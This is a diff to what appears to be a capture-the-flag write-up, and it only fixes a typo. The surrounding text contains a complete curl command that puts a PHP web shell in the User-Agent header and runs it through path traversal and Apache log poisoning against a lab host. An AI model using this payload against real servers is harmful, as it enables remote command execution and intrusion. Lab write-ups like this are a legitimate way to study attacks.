@@ -323,7 +323,7 @@ new ip 10.10.42.190
 
 ### making initial foothold scriptable w/ curl
 
-using curl this time to plant rce, used burpsuite to buld curl request
+using curl this time to plant rce, used burpsuite to build curl request
 
 `curl -i -s -k -X $'GET' -H $'Host: 10.10.42.190' -H $'User-Agent: <?php system($_GET[\'c\']); ?>' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Referer: http://10.10.42.190/' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' $'http://10.10.42.190/?view=cat/../../../../../../../../../..//var/log/apache2/access&ext=.log'`
 
